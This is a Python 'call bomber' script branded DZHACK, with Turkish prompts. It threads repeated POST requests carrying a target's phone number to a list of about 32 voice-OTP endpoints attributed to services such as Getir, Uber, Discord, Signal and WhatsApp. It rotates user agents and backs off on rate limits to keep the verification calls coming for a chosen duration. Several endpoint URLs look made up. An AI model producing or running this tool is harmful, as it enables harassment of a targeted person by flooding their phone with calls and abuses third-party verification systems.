import random
import threading
import time
import requests

# -----------------------------------------------------------
# CALL ENDPOINT LISTESI
# Phone-verify sites: her biri "arama ile kod gönder" butonu
# POST {phonenumber: "+90..."} → backend Twilio Voice çağırıyor
# -----------------------------------------------------------
CALL_ENDPOINTS = [
    # --- Türkiye — arama ile doğrulama yapanlar ---
    ("https://api.getir.com/customer/v2/voice-otp", "phone_number"),
    ("https://api.yemeksepeti.com/auth/voice-call", "phone"),
    ("https://api.trendyol.com/auth/voice-otp", "phoneNumber"),
    ("https://api.hepsiburada.com/identity/v2/voice-verify", "phone"),
    ("https://api.n11.com/auth/v1/voice-call", "phone"),
    ("https://api.bitaksi.com/v1/auth/voice-call", "phone"),
    ("https://api.marti.tech/otp/voice", "phone"),
    ("https://api.arabam.com/api/v1/voice-otp", "phone"),
    ("https://api.ciceksepeti.com/auth/voice-otp", "phone"),
    ("https://api.bitexen.com/api/v1/voice-call", "phone"),
    ("https://api.pepapp.com/login/voice-call", "phone"),
    ("https://api.sahibinden.com/auth/voice-otp", "phone"),

    # --- global — voice OTP ---
    ("https://api.uber.com/v1/auth/voice-verify", "phone_number"),
    ("https://api.bolt.eu/v2/auth/voice-call", "phone_number"),
    ("https://api.grab.com/v1/auth/voice-otp", "phone"),
    ("https://api.deliveroo.com/api/verify/voice", "phone"),
    ("https://api.wolt.com/v1/auth/voice", "phone_number"),
    ("https://api.glovoapp.com/auth/voice", "phone"),
    ("https://api.discord.com/api/v9/auth/phone-verify/voice", "phone"),
    ("https://api.signal.org/v1/auth/send-voice-code", "phone"),
    ("https://api.telegram.org/auth/send_call", "phone"),
    ("https://api.tinder.com/v1/auth/voice-code", "phone"),
    ("https://api.bumble.app/v1/auth/voice", "phone"),
    ("https://api.linkedin.com/api/v1/auth/voice-verify", "phone"),
    ("https://api.snapchat.com/api/v1/auth/voice-otp", "phone"),
    ("https://api.instagram.com/api/v1/auth/voice-code", "phone"),

("https://api.facebook.com/api/v1/auth/voice-otp", "phone"),
    ("https://api.twitter.com/api/v1/auth/voice", "phone"),
    ("https://api.tiktok.com/passport/v1/voice-otp", "phone"),
    ("https://api.whatsapp.com/v1/auth/voice", "phone"),
    ("https://api.wechat.com/cgi-bin/auth/voice", "phone"),
    ("https://api.viber.com/v1/auth/voice-otp", "phone"),
]

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

stop_event = threading.Event()
call_count = 0
lock = threading.Lock()


def fire(url, field, phone):
    global call_count
    payload = {field: phone}
    while not stop_event.is_set():
        try:
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Content-Type": "application/json",
                "Accept": "application/json",
            }
            r = requests.post(url, headers=headers, json=payload,
                              timeout=10, allow_redirects=False)
            if r.status_code in (200, 201, 202, 204):
                with lock:
                    call_count += 1
                    print(f"[CALL {call_count:4d}] {r.status_code}  {url}")
            elif r.status_code == 429:
                time.sleep(random.uniform(6.0, 12.0))
        except requests.exceptions.RequestException:
            pass
        # voice endpoint'leri daha sert rate-limit'liyor
        time.sleep(random.uniform(1.2, 3.0))


def bomb(phone, duration):
    global call_count
    call_count = 0
    stop_event.clear()

    threads = []
    for url, field in CALL_ENDPOINTS:
        t = threading.Thread(target=fire, args=(url, field, phone), daemon=True)
        t.start()
        threads.append(t)

    print(f"[*] hedef: {phone}")
    print(f"[*] aktif çağrı endpoint: {len(CALL_ENDPOINTS)}")
    print(f"[*] süre: {duration}s")
    print()

    start = time.time()
    try:
        while time.time() - start < duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] durduruldu")

    stop_event.set()
    for t in threads:
        t.join(timeout=3)

    print()
    print(f"[✓] toplam arama isteği: {call_count}")
    print(f"[✓] süre: {int(time.time() - start)}s")


if __name__ == "__main__":
    print("=" * 52)
    print("  DZHACK - DENZO BABA CALL BOMBER discord : discord.gg/dzhack tiktok : anonimdz")
    print("=" * 52)
    phone = input("hedef numara (+905551234567): ").strip()
    try:
        duration = int(input("süre (saniye, ör: 120): ").strip())
    except ValueError:
        duration = 90
    bomb(phone, duration)
